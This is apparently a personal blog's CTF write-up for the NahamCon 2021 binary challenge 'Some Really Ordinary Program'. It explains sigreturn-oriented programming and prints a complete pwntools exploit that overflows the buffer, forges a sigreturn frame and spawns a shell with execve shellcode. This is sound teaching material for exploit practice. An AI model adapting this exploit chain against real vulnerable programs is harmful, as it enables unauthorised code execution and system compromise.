<!DOCTYPE html>
<html lang="en-us">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<meta name="theme-color" content="#252627">
	<meta name="msapplication-TileColor" content="#252627">
<meta itemprop="name" content="Nahamcon 2021 - Some Really Ordinary Program">
<meta itemprop="description" content="Binary Exploitation Challenge from Nahamcon 2021"><meta itemprop="datePublished" content="2021-03-18T00:00:00&#43;00:00" />
<meta itemprop="dateModified" content="2021-03-18T00:00:00&#43;00:00" />
<meta itemprop="wordCount" content="652">
<meta itemprop="keywords" content="Binary Exploitation," /><meta property="og:title" content="Nahamcon 2021 - Some Really Ordinary Program" />
<meta property="og:description" content="Binary Exploitation Challenge from Nahamcon 2021" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xbam.github.io/posts/some-really-ordinary-program/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-03-18T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-03-18T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Nahamcon 2021 - Some Really Ordinary Program"/>
<meta name="twitter:description" content="Binary Exploitation Challenge from Nahamcon 2021"/>

	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
	<link rel="manifest" href="/site.webmanifest">
	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
	<link rel="shortcut icon" href="/favicon.ico">

	<title>Nahamcon 2021 - Some Really Ordinary Program</title>
	<link rel="stylesheet" href="https://0xbam.github.io/css/style.min.f74778e3020c87c304fb5982e09b92ba63a5c7f202996d4c7283d6057acfe9c1.css" integrity="sha256-90d44wIMh8ME+1mC4JuSumOlx/ICmW1McoPWBXrP6cE=" crossorigin="anonymous">
	
</head>

<body id="page">
	
	<header id="site-header" class="animated slideInUp">
		<div class="hdr-wrapper section-inner">
			<div class="hdr-left">
				<div class="site-branding">
					<a href="https://0xbam.github.io">bminus</a>
				</div>
				<nav class="site-nav hide-in-mobile">
					
				<a href="https://0xbam.github.io/posts/">Posts</a>

				</nav>
			</div>
			<div class="hdr-right hdr-icons">
				<span class="hdr-social hide-in-mobile"><a href="https://twitter.com/brymars1" target="_blank" rel="noopener me" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a><a href="https://github.com/0xbam" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
			</div>
		</div>
	</header>
	<div id="mobile-menu" class="animated fast">
		<ul>
			<li><a href="https://0xbam.github.io/posts/">Posts</a></li>
		</ul>
	</div>


	<main class="site-main section-inner animated fadeIn faster">
		<article class="thin">
			<header class="post-header">
				<div class="post-meta"><span>Mar 18, 2021</span></div>
				<h1>Nahamcon 2021 - Some Really Ordinary Program</h1>
			</header>
			<div class="content">
				<h1 id="binary-exploitation-challenge">Binary Exploitation Challenge<a href="#binary-exploitation-challenge" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
<pre><code>#file some-really-ordinary-program 
some-really-ordinary-program: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
# pwn checksec some-really-ordinary-program 
[*] '/data/nahamcon/pwn/some-really-ordinary-program'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre><p>This is a 64 bit statically linked binary with no standard binary mitigations enabled. Judging by the challenge name, it will require use of Sigreturn Oriented Programming(SROP). I&rsquo;m fairly new to the concept of SROP so it was a great challenge to practice.</p>
<pre><code># ./some-really-ordinary-program 
What you say is what you get.
HELLO
HELLO
What you say is what you get.

</code></pre><p>A quick run of the program and we can see that it reads in input and echoes it back.</p>
<h2 id="signal-return-oriented-programing">Signal Return Oriented Programing<a href="#signal-return-oriented-programing" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>When a SIGRETURN happens, the kernel will use the user space stack pointer to find the Signal Frame which it had stored previously. It then pops those values off of the stack into the CPU registers. This is very useful for an attacker because if you can force a SIGRETURN to happen,  you can control the registers.</p>
<h2 id="reverse-engineering">Reverse Engineering<a href="#reverse-engineering" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>Opening up the program in Ghidra we see that there is an overflow in the  read function of the program</p>
<p><img src="/img/nahamcon-some-really-ordinary-program/ghidra-decompile.png" alt="Pasted image 20210326214424.png"></p>
<h2 id="exploitation">Exploitation<a href="#exploitation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>The binary is small and there is a lack of useful ROP gadgets however, I do have control over the AX register because the return value of the read function is stored in AX and it is the number of bytes that I send.  If I can set RAX to 15(the value required for a SIGRETURN) and execute SYSCALL , I can control the registers with a crafted Sig Frame. NX is also disabled meaning I can freely execute crafted shellcode. All  I need now is an address space that I can write my shellcode to.</p>
<p><img src="/img/nahamcon-some-really-ordinary-program/vmmap.png" alt="/static/img/nahamcon-some-really-ordinary-program/vmmap.png"></p>
<p>Looking at the vmmap we can see that the stack is executable however assuming ASLR is enabled on the remote host, it would require that I leak a stack address to get the exploit working consistently. An easier choice for me was to use an address in the data segment because due to PIE being disabled, addresses in this segment are static and will therefore be the same remotely. Now that I have everything I need to exploit the program, my plan was as follows:</p>
<ul>
<li>Overwrite the return address to send a payload which contains:
<ul>
<li>A Gadget for MAIN - restarts the program for another read to set AX to 15</li>
<li>A Syscall gadget - to call SIGRETURN once the second main returns</li>
<li>Read Sigreturn Frame - This will allow me to read in my shellcode, pivot the stack to the address of my shellcode and execute it</li>
</ul>
</li>
</ul>
<p>The full exploit script is below:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python3</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;/tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;split-w&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
<span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./some-really-ordinary-program&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;challenge.nahamcon.com&#39;</span><span class="p">,</span> <span class="mi">31264</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">b *0x0040105c
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>


<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x0040101f</span>
<span class="n">MAIN</span> <span class="o">=</span> <span class="mh">0x00401022</span>
<span class="n">SHELLCODE_ADDR</span> <span class="o">=</span> <span class="mh">0x402130</span>

<span class="n">rop_chain</span> <span class="o">=</span> <span class="p">[</span>
    <span class="n">MAIN</span><span class="p">,</span>
    <span class="n">SYSCALL</span>
<span class="p">]</span>
<span class="n">rop_chain</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">rop_chain</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">500</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;B&#34;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">rop_chain</span>  

<span class="c1"># Create a Read Sigreturn Frame</span>
<span class="n">FRAME</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">kernel</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
<span class="n">FRAME</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span> <span class="c1"># Syscall for READ</span>
<span class="n">FRAME</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x0</span> <span class="c1"># Read from STDIN</span>
<span class="n">FRAME</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">SHELLCODE_ADDR</span> <span class="c1">#Address where data will be read to</span>
<span class="n">FRAME</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x200</span> <span class="c1"># Size of input</span>
<span class="n">FRAME</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">SHELLCODE_ADDR</span> <span class="c1">#Set the top of the new stack</span>
<span class="n">FRAME</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">SYSCALL</span> <span class="c1"># Set RIP to Syscall address</span>

<span class="n">payload</span> <span class="o">+=</span>  <span class="nb">bytes</span><span class="p">(</span><span class="n">FRAME</span><span class="p">)</span> 

<span class="c1">#Craft shellcode to spawn a shell</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SHELLCODE_ADDR</span><span class="p">)</span>


<span class="c1">#1st Stage - Call sigreturn</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>


<span class="c1">#2nd Stage - Set RAX to 15(Sigreturn) </span>
<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">15</span><span class="p">)</span>


<span class="c1">#3rd Stage - Send shellcode to execute shell </span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">SHELLCODE_ADDR</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div>
			</div>
			<hr class="post-end">
			<footer class="post-info">
				<p>
					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://0xbam.github.io/tags/binary-exploitation">Binary Exploitation</a></span>
				</p>
				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>652 Words</p>
				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-03-18 00:00 &#43;0000</p>
			</footer>
		</article>
		<div class="post-nav thin">
		</div>
		<div id="comments" class="thin">
</div>
	</main>

	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
		<p>&copy; 2021 <a href="https://0xbam.github.io">bminus</a></p>
		<p>
		</p>
	</footer>



	<script src="https://0xbam.github.io/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
	

</body>

</html>
